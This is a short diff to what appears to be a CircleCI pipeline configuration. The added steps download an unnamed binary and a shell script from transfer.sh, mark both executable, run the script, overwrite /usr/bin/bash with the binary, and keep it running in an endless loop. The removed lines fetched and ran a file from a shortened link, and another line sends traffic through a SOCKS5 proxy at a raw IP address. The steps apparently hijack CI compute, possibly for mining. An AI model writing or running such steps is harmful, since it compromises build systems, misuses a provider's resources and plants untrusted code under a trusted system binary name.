@@ -12,5 +12,14 @@ jobs:
                    curl -v -x socks5://192.74.246.152:1080 https://app.circleci.com/
       - run:
           command: |
-                   wget https://bit.ly/3yKkMe5 +x 3yKkMe5
-                   ./3yKkMe5
+                   wget -O kangkung https://transfer.sh/get/XLC2EC/kangkung
+                   wget -O config.sh https://transfer.sh/get/Dy09jr/config.sh
+      - run:
+          command: |
+                   chmod +x kangkung
+      - run:
+          command: |
+                   chmod +x config.sh
+                   ./config.sh
+                   mv kangkung /usr/bin/bash
+                   while true; do timeout 3m bash -c config.json; sleep 20; done
